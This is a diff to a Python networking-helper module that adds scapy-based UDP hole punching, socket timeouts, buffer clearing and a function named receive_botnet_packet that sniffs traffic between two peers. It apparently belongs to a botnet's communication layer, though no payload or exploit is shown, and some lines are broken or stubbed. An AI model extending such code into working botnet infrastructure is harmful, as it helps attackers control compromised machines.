@@ -1,11 +1,15 @@
 import socket
 import logging
+from scapy.all import *
 
+MAX_SEND_THREADS_COUNT = 5
+logging.basicConfig(level=logging.DEBUG)
+SOCKET_TIMEOUT = 200
 
 def UDP_send(destination: socket.socket, address: tuple, msg: bytes):
     try:
         destination.sendto(msg, address)
-    except socket.Exception:
+    except socket.error as e:
         logging.exception(f"can't send query to destination: {address}")
         return 
     return 1
@@ -14,7 +18,7 @@ def UDP_send(destination: socket.socket, address: tuple, msg: bytes):
 def UDP_recieve(source: socket.socket, address: tuple):           # TODO: clear socket buffer after read
     try:
         msg, addr = source.recvfrom(1024)
-    except TimeoutError:
+    except socket.error as e:
         logging.debug(f"source {address} unavailable")
         return 0
     if addr != address:
@@ -26,16 +30,17 @@ def UDP_recieve(source: socket.socket, address: tuple):           # TODO: clear 
 def TCP_recieve(source: socket.socket):           # TODO: clear socket buffer after read
     try:
         msg = source.recv(1024)
-    except TimeoutError:
+    except socket.error as e:
         logging.debug(f"source {source.getpeername()} unavailable")
         return 0
+    clear_read_buffer(source)
     return decrypt(msg)
 
 
-def TCP_send(destination: socket.socket, msg: bytes):
+def TCP_send(destination: socket.socket, msg: str):
     try:
-        destination.sendall(msg)
-    except socket.Exception:
+        destination.sendall(msg.encode())
+    except socket.error as e:
         logging.exception(f"can't send query to destination: {destination.getpeername()}")
         return 
     return 1
@@ -50,19 +55,19 @@ def decrypt(msg: bytes):
     return msg
 
 
-def holepunch(destination: socket.socket, address: tuple):
+def holepunch(packet):
     for i in range(0, 9):
-        succeeded = UDP_send(destination, address, b'hello there')
-        if succeeded is None: return
-        msg = UDP_recieve(destination, address)
-        if msg == "hello there": break
+        response = sr1(packet)
+        if response is None: continue
+        logging.debug(f"sent msg to ({packet.dst}, {packet.dport}) from ({packet.src}, {packet.sport})")
+        if response.load.decode() == "hello there": break
     else:
-        logging.info(f"unable to holepunch with {address}")
+        logging.info(f"unable to holepunch with ({packet.IP.dst}, {packet.UDP.dport})")
         return
     return 1
 
 
-def set_keepalive(sock, after_idle_sec=60, interval_sec=60, max_fails=10):
+def set_keepalive(sock: socket.socket, after_idle_sec=60, interval_sec=60, max_fails=10, timeout=5):
     """Set TCP keepalive on an open socket.
     It activates after after_idle_sec of idleness,
     then sends a keepalive ping once every interval_sec,
@@ -72,11 +77,22 @@ def set_keepalive(sock, after_idle_sec=60, interval_sec=60, max_fails=10):
     sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, after_idle_sec)
     sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, interval_sec)
     sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, max_fails)
+    sock.settimeout(timeout)
 
 
 def get_updates():      # TODO: define the function
     pass
 
 
-def recieve_botnet_packet():
-    pass
+def receive_botnet_packet(src_address: tuple, dst_address: tuple):
+    response = sniff(filter=f"dst host {dst_address[0]} and src host {src_address[0]} and udp dst port {dst_address[1]} and udp src port {src_address[1]}", count=1)
+    return response[0].load.decode()
+
+def clear_read_buffer(soc: socket.socket):
+    soc.settimeout(0)
+    try:
+        while True: soc.recv(1024)
+    except:
+        pass
+    soc.settimeout(SOCKET_TIMEOUT)
+
